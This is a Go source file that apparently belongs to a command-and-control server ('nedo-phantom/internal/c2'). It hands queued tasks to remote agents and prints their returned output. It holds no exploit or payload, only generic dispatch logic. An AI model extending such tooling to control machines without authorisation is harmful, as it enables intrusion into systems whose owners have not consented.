package handler

import (
    "fmt"
    "nedo-phantom/internal/c2/db"
    "nedo-phantom/internal/common"
)

type MessageHandler struct {
    tasks *db.TaskQueue
}

func NewMessageHandler(tasks *db.TaskQueue) *MessageHandler {
    return &MessageHandler{tasks: tasks}
}

// Handle обрабатывает сообщение от агента
func (h *MessageHandler) Handle(msg *common.Message) (*common.Message, error) {
    if msg == nil {
        return nil, fmt.Errorf("message is nil")
    }

    switch msg.Type {
    case "get_task":
        return h.handleGetTask()
    case "result":
        return h.handleResult(msg.Result)
    default:
        return nil, fmt.Errorf("unknown message type: %s", msg.Type)
    }
}

func (h *MessageHandler) handleGetTask() (*common.Message, error) {
    task := h.tasks.GetNextTask()
    if task == nil {
        return &common.Message{Type: "no_task"}, nil
    }
    return &common.Message{
        Type: "task",
        Task: task,
    }, nil
}

func (h *MessageHandler) handleResult(result *common.TaskResult) (*common.Message, error) {
    if result == nil {
        return nil, fmt.Errorf("result is nil")
    }
    fmt.Printf("[+] Task %s result: %s\n", result.TaskID, result.Output)
    if result.Error != "" {
        fmt.Printf("[+] Task error: %s\n", result.Error)
    }
    return nil, nil
}
